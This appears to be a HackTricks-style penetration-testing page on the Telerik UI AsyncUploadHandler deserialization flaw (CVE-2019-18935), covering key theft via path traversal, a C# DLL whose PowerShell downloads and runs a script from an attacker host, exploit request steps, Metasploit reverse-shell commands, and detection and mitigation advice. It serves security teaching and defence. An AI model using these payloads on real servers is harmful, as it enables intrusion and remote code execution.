# ASP.NET Telerik UI AsyncUploadHandler Deserialization RCE (CVE-2019-18935)

{{#include /banners/hacktricks-training.md}}

## TL;DR

- Affected product: Telerik UI for ASP.NET AJAX 2012–2019 (prior to R1 2020)
- Vulnerable handler: `Telerik.Web.UI.AsyncUploadHandler`
- Issue: Attacker-controlled encrypted blob is **decrypted and deserialized** with `LosFormatter`, allowing
  arbitrary file write and remote code execution **without authentication**.
- Encryption / validation keys can be obtained through older Telerik traversal bugs (CVE-2017-11317 / 11357)
  or default/weak configuration.
- Widely weaponised – Metasploit module `exploit/windows/http/telerik_async_upload` & multiple PoCs.

---

## How the vulnerability works

1. The **RadAsyncUpload** component sends files to `/Telerik.Web.UI.AsyncUploadHandler.ashx?type=rau`.
2. The request body contains a `rauPostData` parameter (Base64, AES-encrypted, MAC’ed) that embeds
   upload metadata **and the file content**.
3. When the handler receives the request it:
   * Decrypts the blob using the **`EncryptionKey`** and verifies the HMAC with **`HashKey`** taken from
     `web.config` (section `Telerik.AsyncUpload.Configuration`).
   * **Deserialises** the resulting `Dictionary<string,object>` with the vulnerable **`LosFormatter`**.
4. If the attacker knows valid keys they can craft a malicious object graph that contains a gadget which
   executes upon deserialization (for example `ObjectDataProvider`).
5. Prior to deserialization, the handler stores the uploaded file on disk:
   `%TEMP%\TelerikWebUI\<GUID>.<ATTACKER_EXTENSION>` – the extension can be chosen by the attacker.
6. By uploading a DLL/ASPX file to a location that will later be loaded by IIS or by any process
   (e.g. `vcruntime140.dll`) the attacker obtains **arbitrary code execution** on the server.

> The encryption keys are the *only* protection.  If they are predictable, hard-coded or leaked, exploitation is trivial.

---

## Obtaining the encryption keys

* **Default keys** – versions prior to 2013 use the static key `6A6F103C2E8E4098A5B47C2C79B3A2F6`.
* **CVE-2017-11317 / CVE-2017-11357** – Directory traversal in `DialogHandler.aspx` allows unauthenticated
  download of `web.config` from the server:
  ```http
  /Telerik.Web.UI.DialogHandler.aspx?dialogName=DocumentManager&txtUrl=../../../../web.config
  ```
* **Verbose error & backup files** – `web_-(timestamp).config`, `.bak`, Git history…
* **Source disclosure** via mis-configuration (e.g. `~/_App_Temp/`) may leak the keys.

---

## Manual exploitation example

1. **Generate malicious DLL** that executes PowerShell when loaded:
   ```csharp
   // payload.cs
   using System;
   public class Class1
   {
       public Class1()
       {
           System.Diagnostics.Process.Start("powershell",
               "(New-Object Net.WebClient).DownloadString('http://attacker/pwn.ps1') | iex");
       }
   }
   ```
   ```bash
   csc /target:library /out:vcruntime140.dll payload.cs
   ```
2. **Craft encrypted rauPostData** using a public PoC:
   ```bash
   python3 CVE-2019-18935.py -u http://victim/ \
          --enc-key <EncryptionKey> --hash-key <HashKey> \
          --upload vcruntime140.dll --dest vcruntime140.dll
   ```
3. **Send the request** (snippet):
   ```http
   POST /Telerik.Web.UI.AsyncUploadHandler.ashx?type=rau HTTP/1.1
   Host: victim
   Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

   ------WebKitFormBoundary
   Content-Disposition: form-data; name="rauPostData"

   <BASE64_BLOB>
   ------WebKitFormBoundary--
   ```
4. Uploaded DLL lands in `%TEMP%` and is loaded immediately or at next process start – giving RCE.

---

## Metasploit usage

```
msf> use exploit/windows/http/telerik_async_upload
msf> set RHOSTS victim
msf> set RPORT 80
msf> set TARGETURI /
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> run
```
Metasploit will automatically attempt to retrieve the keys via the directory traversal bugs before delivering the RCE payload.

---

## Detection ideas

* **IIS Logs** – requests to `Telerik.Web.UI.AsyncUploadHandler.ashx` with query `type=rau|raw|timeout`.
* **Windows Event Log** – `Application` events where **source** = `Telerik.Web.UI` and **Exception** contains
  `System.InvalidCastException`.
* **File system** – creation of `%TEMP%\TelerikWebUI\*.dll|*.aspx`.
* **PowerShell** – suspicious `DownloadFile` followed by `Add-MpPreference -ExclusionPath` (AV bypass observed in wild).

---

## Mitigation

1. **Upgrade** to `Telerik UI for ASP.NET AJAX` **2021.3** (or later) which enforces additional validation.
2. **Regenerate keys** – use random `EncryptionKey` / `HashKey` (128-bit hex) and keep them secret.
3. Restrict the handler (`Telerik.Web.UI.AsyncUpload`) to **authenticated users only**.
4. Disable dangerous file extensions via `TemporaryFileExtension` and validate uploads server-side.
5. Place the upload handler in its own application pool with minimal privileges and enable AppLocker / constrained PowerShell.

---

## References

- [Pentest Partners – Sil3ncer Deployed – RCE, Porn Diversion, and Ransomware on an SFTP-only Server](https://www.pentestpartners.com/security-blog/sil3ncer-deployed-rce-porn-diversion-and-ransomware-on-an-sftp-only-server/)
- [Telerik official advisory](https://www.telerik.com/support/kb/aspnet-ajax/details/cve-2019-18935)
- [Rapid7 Metasploit module documentation](https://docs.rapid7.com/metasploit/telerik-ui-async-upload-rce/)
- [Bishop Fox – Technical write-up](https://bishopfox.com/blog/2020/02/telerik-webui-exploit)

{{#include /banners/hacktricks-training.md}}